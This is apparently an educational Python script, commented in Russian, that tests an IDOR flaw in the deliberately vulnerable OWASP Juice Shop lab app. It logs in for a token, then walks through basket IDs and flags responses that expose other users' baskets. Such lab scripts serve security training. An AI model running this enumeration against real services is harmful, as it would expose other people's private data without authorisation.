"""
idor_baskets.py — учебный скрипт для проверки IDOR на корзинах OWASP Juice Shop.

Что делает:
  1. Логинится в Juice Shop, получает JWT.
  2. С этим токеном перебирает /rest/basket/{id} по диапазону.
  3. Помечает как находку ответы 200 с непустым телом (доступ к чужой корзине).

Запуск:
  python3 idor_baskets.py --email you@juice.sh --password 123 --start 1 --end 20
"""

import argparse
import sys

import requests


def login(base, email, password):
    """Фаза 1: аутентификация. Возвращает JWT из ответа Juice Shop."""
    url = f"{base}/rest/user/login"
    try:
        r = requests.post(url, json={"email": email, "password": password}, timeout=10)
    except requests.RequestException as e:
        sys.exit(f"[x] Не удалось соединиться с {base}: {e}")

    if r.status_code != 200:
        sys.exit(f"[x] Логин не прошёл ({r.status_code}). Проверь email/пароль и адрес.")

    try:
        # Juice Shop кладёт токен в authentication.token
        return r.json()["authentication"]["token"]
    except (KeyError, ValueError):
        sys.exit("[x] Токен не найден в ответе — структура ответа не та, что ожидалась.")


def enumerate_baskets(base, token, start, end):
    """
    Фаза 2+3: перебор + анализ.
    Токен едет в заголовке Authorization: Bearer <token> на КАЖДЫЙ запрос —
    без него сервер ответит 401 (не аутентифицирован) и IDOR не проверить.
    """
    headers = {"Authorization": f"Bearer {token}"}
    findings = []

    for basket_id in range(start, end + 1):
        url = f"{base}/rest/basket/{basket_id}"
        try:
            r = requests.get(url, headers=headers, timeout=10)
        except requests.RequestException as e:
            print(f"[ ] id={basket_id}: ошибка запроса ({e})")
            continue

        # Находка = 200 И непустое тело. Только 200 недостаточно:
        # сервер может вернуть пустой 200, а это не доказательство доступа.
        is_hit = False
        if r.status_code == 200:
            try:
                data = r.json().get("data")
                is_hit = bool(data)
            except ValueError:
                is_hit = False

        if is_hit:
            findings.append(basket_id)
            print(f"[!] IDOR  id={basket_id}: 200 + данные — доступна чужая корзина")
        else:
            print(f"[ ] id={basket_id}: {r.status_code}")

    return findings


def main():
    p = argparse.ArgumentParser(description="IDOR-проверка корзин Juice Shop (учебный стенд).")
    p.add_argument("--base", default="http://localhost:3000", help="адрес Juice Shop")
    p.add_argument("--email", required=True, help="email для логина")
    p.add_argument("--password", required=True, help="пароль")
    p.add_argument("--start", type=int, default=1, help="начало диапазона id")
    p.add_argument("--end", type=int, default=20, help="конец диапазона id")
    args = p.parse_args()

    print(f"[*] Логин на {args.base} как {args.email} ...")
    token = login(args.base, args.email, args.password)
    print("[*] Токен получен. Перебираю корзины "
          f"{args.start}..{args.end}\n")

    findings = enumerate_baskets(args.base, token, args.start, args.end)

    print("\n" + "=" * 40)
    if findings:
        print(f"[!] IDOR подтверждён. Доступные чужие корзины: {findings}")
        print("    Root cause: сервер не проверяет принадлежность корзины пользователю.")
    else:
        print("[ ] Находок нет в этом диапазоне (доступ ограничен либо id пустые).")


if __name__ == "__main__":
    main()